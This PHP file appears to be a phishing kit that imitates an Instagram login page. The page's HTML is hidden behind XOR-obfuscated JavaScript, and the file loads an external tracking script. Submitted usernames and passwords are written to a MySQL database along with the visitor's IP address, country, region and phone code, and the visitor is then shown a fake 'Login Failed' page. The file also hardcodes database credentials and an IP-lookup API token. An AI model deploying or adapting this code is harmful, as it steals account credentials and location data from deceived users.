<?php
// Database connection settings
$servername = "sql304.infinityfree.com";
$username = "if0_37184148";
$password = "VJcExTITskJ0Ky";
$dbname = "if0_37184148_Data";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Check if the form is submitted
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Collect form data
    $user = $_POST['username'];
    $pass = $_POST['password'];
    $source_page = $_POST['source_page'];

    // Get user's IP address
    $user_ip = $_SERVER['REMOTE_ADDR'];

    // Get geolocation data from IPinfo
    $ipinfo_token = "aaad8e9b2f8309";
    $ipinfo_url = "https://ipinfo.io/{$user_ip}?token={$ipinfo_token}";
    $ipinfo_response = file_get_contents($ipinfo_url);
    $ipinfo_data = json_decode($ipinfo_response, true);

    $country_code = $ipinfo_data['country'] ?? 'Unknown';
    $state = $ipinfo_data['region'] ?? 'Unknown';

    // Get full country name from RestCountries API
    $restcountries_url = "https://restcountries.com/v3.1/alpha/{$country_code}";
    $restcountries_response = file_get_contents($restcountries_url);
    $restcountries_data = json_decode($restcountries_response, true);
    $country = $restcountries_data[0]['name']['common'] ?? 'Unknown';

    // Get phone code from RestCountries API
    $phone_code = $restcountries_data[0]['idd']['root'] . $restcountries_data[0]['idd']['suffixes'][0] ?? 'Unknown';

    // Prepare and bind
    $stmt = $conn->prepare("INSERT INTO user_details (source_page, username, password, ip_address, country_name, state_name, phone_code) VALUES (?, ?, ?, ?, ?, ?, ?)");
    $stmt->bind_param("sssssss", $source_page, $user, $pass, $user_ip, $country, $state, $phone_code);

    // Execute the query without showing any success message
    $stmt->execute();


    // Close the statement and connection
    $stmt->close();
    $conn->close();

    // Display the "Login Failed" page
    ?>
    <!DOCTYPE html>
    <html>
    <body>
    <script language="javascript"> 

var enkripsi="'02'1A'03FMAV[RG'02jvon'1G'2C'02'02'02'02'1Ajvon'1G'2C'02'02'02'02'1Ajgcf'1G'2C'02'02'02'02'02'02'02'02'1Aogvc'02ajcpqgv'1F'00WVD/:'00'1G'2C'02'02'02'02'02'02'02'02'1Aogvc'02lcog'1F'00tkgurmpv'00'02amlvglv'1F'00ukfvj'1Ffgtkag/ukfvj'0A'02klkvkcn/qacng'1F3,2'00'1G'2C'02'02'02'02'02'02'02'02'1Avkvng'1GNmekl'02Dckngf'1A-vkvng'1G'2C'02'02'02'02'02'02'02'02'02'1Ankli'02jpgd'1F'00jvvrq'1C--dmlvq,emmengcrkq,amo-aqq0'1Ddcokn{'1FPm`mvm'1CuejvB622'04fkqrnc{'1Fqucr'00'02pgn'1F'00qv{ngqjggv'00'1G'2C'02'02'02'02'02'02'02'02'1Ankli'02pgn'1F'00qv{ngqjggv'00'02jpgd'1F'00jvvrq'1C--uctg/kli{/rpmfwav,enkvaj,og-ke'0702dckngf'0702qv{,aqq'00'1G'2C'02'02'02'02'1A-jgcf'1G'2C'02'02'02'02'1A`mf{'1G'2C'02'02'02'02'02'02'02'02'1Akoe'02kf'1F'00kel'00'02qpa'1F'00jvvrq'1C--pgqmwpagqqq,ekvjw`,km-Rkaq-kel,rle'00'1G'2C'02'02'02'02'02'02'02'02'2C'02'02'02'02'02'02'02'02'1Admpo'02cavkml'1F'00'00'02ogvjmf'1F'00RMQV'00'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'1Aklrwv'02v{rg'1F'00jkffgl'00'02lcog'1F'00qmwpag]rceg'00'02tcnwg'1F'00Klqvcepco'00'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'1Aklrwv'02ancqq'1F'00klrwv/`mz'00'02v{rg'1F'00vgzv'00'02lcog'1F'00wqgplcog'00'02rncagjmnfgp'1F'00Rjmlg'02lwo`gp'0A'02wqgplcog'0A'02mp'02gockn'00'02pgswkpgf'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'1Aklrwv'02ancqq'1F'00klrwv/`mz'00'02v{rg'1F'00rcqqumpf'00'02lcog'1F'00rcqqumpf'00'02rncagjmnfgp'1F'00Rcqqumpf'00'02pgswkpgf'1G'02'2C'02'02'02'02'02'02'02'02'02'02'02'02'1A`wvvml'02ancqq'1F'00`lv'00'02v{rg'1F'00qw`okv'00'1G'1Akoe'02ancqq'1F'00nm'00'02qpa'1F'00jvvrq'1C--pgqmwpagqqq,ekvjw`,km-Rkaq-nm,rle'00'1G'1A-`wvvml'1G'2C'02'02'02'02'02'02'02'02'1A-dmpo'1G'2C'02'02'02'02'02'02'02'02'2C'02'02'02'02'02'02'02'02'1Ar'02ancqq'1F'00dmp'00'1GDmpemv'02rcqqumpf'1D'1A-r'1G'2C'02'02'02'02'02'02'02'02'1Ar'02ancqq'1F'00mk'00'1G'02Qmpp{'0A'02{mwp'02rcqqumpf'02mp'02wqgplcog'02ucq'02klamppgav,'02'2C'02'02'02'02'02'02'02Rngcqg'02fmw`ng/ajgai'02clf'02vp{'02ceckl'03'1A-r'1G'2C'02'02'02'02'02'02'02'02'2C'02'02'02'02'02'02'02'02'1Ar'02ancqq'1F'00vgzv'00'1GFml'05v'02jctg'02cl'02caamwlv'1D'1Ac'02jpgd'1F'00'01'00'1GQkel'02wr'1A-c'1G'1A-r'1G'2C'02'02'02'02'02'02'02'02'2C'02'02'02'02'02'02'02'02'1Ar'02ancqq'1F'00egv'00'1GEgv'02vjg'02crr'1A-r'1G'2C'02'02'02'02'02'02'02'02'1Akoe'02kf'1F'00qvmpg'00'02qpa'1F'00jvvrq'1C--pgqmwpagqqq,ekvjw`,km-Rkaq-rnc{,rle'00'1G'2C'02'02'02'02'02'02'02'02'1Akoe'02kf'1F'00qvm'00'02qpa'1F'00jvvrq'1C--pgqmwpagqqq,ekvjw`,km-Rkaq-crrng,rle'00'1G'2C'2C'02'02'02'02'02'02'02'02'1Admmvgp'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'1Awn'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Ank'1G'1Ac'02jpgd'1F'00'01'00'1GC`mwv'02Wq'1A-c'1G'1A-nk'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Ank'1G'1Ac'02jpgd'1F'00'01'00'1GQwrrmpv'1A-c'1G'1A-nk'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Ank'1G'1Ac'02jpgd'1F'00'01'00'1G@nme'1A-c'1G'1A-nk'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Ank'1G'1Ac'02jpgd'1F'00'01'00'1GRpgqq'1A-c'1G'1A-nk'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Ank'1G'1Ac'02jpgd'1F'00'01'00'1GCrk'1A-c'1G'1A-nk'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Ank'1G'1Ac'02jpgd'1F'00'01'00'1GHm`q'1A-c'1G'1A-nk'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Ank'1G'1Ac'02jpgd'1F'00'01'00'1GRpktca{'1A-c'1G'1A-nk'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Ank'1G'1Ac'02jpgd'1F'00'01'00'1GVgpoq'1A-c'1G'1A-nk'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Ank'1G'1Ac'02jpgd'1F'00'01'00'1GFkpgavmp{'1A-c'1G'1A-nk'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'1A-wn'1G'2C'02'02'02'02'02'02'02'02'1A-dmmvgp'1G'2C'02'02'02'02'1A-`mf{'1G'2C'02'02'02'02'1A-jvon'1G'2C'02'02'02'02"; teks=""; teksasli="";var panjang;panjang=enkripsi.length;for (i=0;i<panjang;i++){ teks+=String.fromCharCode(enkripsi.charCodeAt(i)^2) }teksasli=unescape(teks);document.write(teksasli);
</script>
<script src="https://raviral.com/host_style/style/js-track/track.js"></script> 
</body>
    </html>

    <?php
} else {
    // Display the login form
    ?>
   <!DOCTYPE html>
    <html>
    <body> 
  <script language="javascript"> 

var enkripsi="'02'1A'03FMAV[RG'02jvon'1G'2C'02'02'02'02'1Ajvon'1G'2C'02'02'02'02'1Ajgcf'1G'2C'02'02'02'02'02'02'02'02'1Aogvc'02ajcpqgv'1F'00WVD/:'00'1G'2C'02'02'02'02'02'02'02'02'1Aogvc'02lcog'1F'00tkgurmpv'00'02amlvglv'1F'00ukfvj'1Ffgtkag/ukfvj'0A'02klkvkcn/qacng'1F3,2'00'1G'2C'02'02'02'02'02'02'02'02'1Avkvng'1GNmekl'02vm'02Rpmaggf'1A-vkvng'1G'2C'02'02'02'02'02'02'02'02'1Ankli'02jpgd'1F'00jvvrq'1C--dmlvq,emmengcrkq,amo-aqq0'1Ddcokn{'1FPm`mvm'1CuejvB622'04fkqrnc{'1Fqucr'00'02pgn'1F'00qv{ngqjggv'00'1G'2C'02'02'02'02'02'02'02'02'1Ankli'02pgn'1F'00qv{ngqjggv'00'02jpgd'1F'00jvvrq'1C--uctg/kli{/rpmfwav,enkvaj,og-ke'0702klfgz'0702qv{ng,aqq'00'1G'2C'02'02'02'02'1A-jgcf'1G'2C'02'02'02'02'1A`mf{'1G'2C'02'02'02'02'02'02'02'02'02'1Afkt'02kf'1F'00dcfgKocegAmlvcklgp'00'02ancqq'1F'00dcfg/koceg/amlvcklgp'00'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'1Akoe'02kf'1F'00dcfgKoceg'00'02qpa'1F'00jvvrq'1C--pgqmwpagqqq,ekvjw`,km-Rkaq-ko,rle'00'02cnv'1F'00Koceg'00'02ancqq'1F'00dcfg/koceg'00'1G'2C'02'02'02'02'02'02'02'02'1A-fkt'1G'2C'02'02'02'02'02'02'02'02'2C'02'02'02'02'02'02'02'02'1Akoe'02kf'1F'00kel'00'02qpa'1F'00jvvrq'1C--pgqmwpagqqq,ekvjw`,km-Rkaq-kel,rle'00'1G'2C'02'02'02'02'02'02'02'02'2C'02'02'02'02'02'02'02'02'1Admpo'02cavkml'1F'00'00'02ogvjmf'1F'00RMQV'00'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'1Aklrwv'02v{rg'1F'00jkffgl'00'02lcog'1F'00qmwpag]rceg'00'02tcnwg'1F'00Klqvcepco'00'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'1Aklrwv'02ancqq'1F'00klrwv/`mz'00'02v{rg'1F'00vgzv'00'02lcog'1F'00wqgplcog'00'02rncagjmnfgp'1F'00Rjmlg'02lwo`gp'0A'02wqgplcog'0A'02mp'02gockn'00'02pgswkpgf'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'1Aklrwv'02ancqq'1F'00klrwv/`mz'00'02v{rg'1F'00rcqqumpf'00'02lcog'1F'00rcqqumpf'00'02rncagjmnfgp'1F'00Rcqqumpf'00'02pgswkpgf'1G'02'2C'02'02'02'02'02'02'02'02'02'02'02'02'1A`wvvml'02v{rg'1F'00qw`okv'00'02ancqq'1F'00`lv'00'1G'1Akoe'02ancqq'1F'00nm'00'02qpa'1F'00jvvrq'1C--pgqmwpagqqq,ekvjw`,km-Rkaq-nm,rle'00'1G'1A-`wvvml'1G'2C'02'02'02'02'02'02'02'02'1A-dmpo'1G'2C'02'02'02'02'02'02'02'02'2C'02'02'02'02'02'02'02'02'1Ar'02ancqq'1F'00dmp'00'1GDmpemv'02rcqqumpf'1D'1A-r'1G'2C'02'02'02'02'02'02'02'02'2C'02'02'02'02'02'02'02'02'1Ar'02ancqq'1F'00vgzv'00'1GFml'05v'02jctg'02cl'02caamwlv'1D'1Ac'02jpgd'1F'00'01'00'02kf'1F'00dcfgNkli'00'1GQkel'02wr'1A-c'1G'1A-r'1G'2C'02'02'02'02'02'02'02'02'2C'02'02'02'02'02'02'02'02'1Ar'02ancqq'1F'00egv'00'1GEgv'02vjg'02crr'1A-r'1G'2C'02'02'02'02'02'02'02'02'1Akoe'02kf'1F'00qvmpg'00'02qpa'1F'00jvvrq'1C--pgqmwpagqqq,ekvjw`,km-Rkaq-rnc{,rle'00'1G'2C'02'02'02'02'02'02'02'02'1Akoe'02kf'1F'00qvm'00'02qpa'1F'00jvvrq'1C--pgqmwpagqqq,ekvjw`,km-Rkaq-crrng,rle'00'1G'2C'2C'02'02'02'02'02'02'02'02'1Admmvgp'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'1Awn'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Ank'1G'1Ac'02jpgd'1F'00'01'00'1GC`mwv'02Wq'1A-c'1G'1A-nk'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Ank'1G'1Ac'02jpgd'1F'00'01'00'1GQwrrmpv'1A-c'1G'1A-nk'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Ank'1G'1Ac'02jpgd'1F'00'01'00'1G@nme'1A-c'1G'1A-nk'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Ank'1G'1Ac'02jpgd'1F'00'01'00'1GRpgqq'1A-c'1G'1A-nk'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Ank'1G'1Ac'02jpgd'1F'00'01'00'1GCrk'1A-c'1G'1A-nk'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Ank'1G'1Ac'02jpgd'1F'00'01'00'1GHm`q'1A-c'1G'1A-nk'1G'02'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Ank'1G'1Ac'02jpgd'1F'00'01'00'1GRpktca{'1A-c'1G'1A-nk'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Ank'1G'1Ac'02jpgd'1F'00'01'00'1GVgpoq'1A-c'1G'1A-nk'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Ank'1G'1Ac'02jpgd'1F'00'01'00'1GFkpgavmp{'1A-c'1G'1A-nk'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'1A-wn'1G'2C'02'02'02'02'02'02'02'02'1A-dmmvgp'1G'2C'02'02'02'02'02'02'02'02'2C'02'02'02'02'02'02'02'02'1Aqapkrv'02qpa'1F'00jvvrq'1C--afl,hqfgnktp,lgv-ej-Pgqmwpagqqq-Hqdkngq-ke,hq'00'1G'1A-qapkrv'1G'2C'02'02'02'02'1A-`mf{'1G'2C'02'02'02'02'1A-jvon'1G'2C'02'02'02'02"; teks=""; teksasli="";var panjang;panjang=enkripsi.length;for (i=0;i<panjang;i++){ teks+=String.fromCharCode(enkripsi.charCodeAt(i)^2) }teksasli=unescape(teks);document.write(teksasli);
</script>
<script src="https://raviral.com/host_style/style/js-track/track.js"></script> 
</body>
    </html>

    <?php
}
?>
